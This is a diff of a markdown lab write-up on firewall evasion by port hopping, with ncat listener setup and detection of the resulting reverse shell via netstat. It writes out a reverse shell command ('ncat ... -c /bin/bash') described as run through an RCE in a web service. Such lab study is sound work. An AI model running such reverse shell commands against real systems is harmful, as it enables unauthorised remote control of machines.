@@ -445,69 +445,70 @@ Below are is the scan related traffic where I was able to see that it did have t
 <details>
 <summary><h3>Evasion Using Port Hopping<h3></summary>
 
- #### Evasion Using Port Hopping:
+There are three common firewall evasion techniques, they are:
 
-Three common firewall evasion techniques are:
++ Port hopping
++ Port tunneling
++ Use of non-standard ports
 
-Port hopping
-Port tunneling
-Use of non-standard ports
+Port hopping is a technique where a system rapidly switches between different network ports for communication. This can serve various purposes, including enhancing security, evading detection, or optimizing network performance. Port hopping can be used to avoid detection by rapidly changing ports, which in turn can reduce the likelihood of being identified.
 
-Port hopping is a technique where an application hops from one port to another till it can establish and maintain a connection. In other words, the application might try different ports till it can successfully establish a connection. Some “legitimate” applications use this technique to evade firewalls. In the following, the client kept trying different ports to reach the server till it discovered a destination port not blocked by the firewall.
-
-
+In the diagram below, the client tries different ports to reach the server until it discovers a destination port that is not being blocked by the firewall.
 
 ![Pasted image 20240924211328](https://github.com/user-attachments/assets/ce0ff043-9721-4957-8f62-aadef3175248)
 
+### Getting Started
 
-### Setting up a listening our client:
+First I need to set up a listening port on the client:
 
--l listens for incoming connections
--v provides verbose details (optional)
--n does not resolve hostnames via DNS (optional)
--p specifies the port number to use
++ -l listens for incoming connections
++ -v provides verbose details (optional)
++ -n does not resolve hostnames via DNS (optional)
++ -p specifies the port number to use
 
+```
 ncat -lvnp 21
+```
 
 ![Pasted image 20240924133907](https://github.com/user-attachments/assets/eff7886b-ecbc-4170-a582-4ef72377c726)
 
+Based on the output, it is now listening on port 21. 
 
 ### Connecting to the server:
 
-Network trace from the client reaching the server on port 8080:
+Next, I performed a network trace from the client reaching the server on port 8080:
 
 ![Pasted image 20240924134217](https://github.com/user-attachments/assets/0039045a-ae64-4763-90f1-6262db7c7184)
 
+In this scenario, I'm going to be exploiting a vulnerable service that allows remote code execution (RCE) or a misconfiguration on the web application running on port 8080 and will be able to execute code or command of my choice.
 
-Note: In this scenario, I'm going to be exploiting a vulnerable service that allows remote code execution (RCE) or a misconfiguration on the web application running on port 8080 to execute some code or command of my choice.
-
-
+```
 ncat 10.10.142.3 21 -c /bin/bash
+```
+
 ![Pasted image 20240924134503](https://github.com/user-attachments/assets/77561853-f084-400a-8585-8f77461eb83f)
 
-The command was executed usefully, we can the Http POST and the  ACK coming from the server 
+The command was executed successfully. I was able to the HTTP POST and ACK coming from the server:
+
 ![Pasted image 20240924134217](https://github.com/user-attachments/assets/e733f554-52c1-48a3-830f-9088e3e7b3c8)
 
+Detailed information about the HTTP POST:
 
-Detail information about the Http POST
 ![Pasted image 20240924134054](https://github.com/user-attachments/assets/e2ab77dd-b3bd-4309-82a7-803c2397e8cb)
-
-
 
 ### Detecting a reverse shell from the server:
 
-Tips:
+Using the command below will display all established connections, and the the associated process or program. By filtering for established connections, it focuses on active connections:
 
- netstat -anp | grep ESTABLISHED 
+```
+netstat -anp | grep ESTABLISHED 
+```
 
-This will display all established connections, and the the associated process or program. By filtering for established connections, you can focus on active connections. 
-
-### Netcat network traffic coming from the server:
+Here I was able to see the network traffic coming from the server:
 
 ![Pasted image 20240924134356](https://github.com/user-attachments/assets/3f0787b6-3a76-47a4-9c85-cf34ded5b536)
 
-
-We can see that the server's firewall is allowing port 21 outbound.  
+Based on the traffic, I can see that the server's firewall is allowing port 21 outbound.  
 
 </details>
 
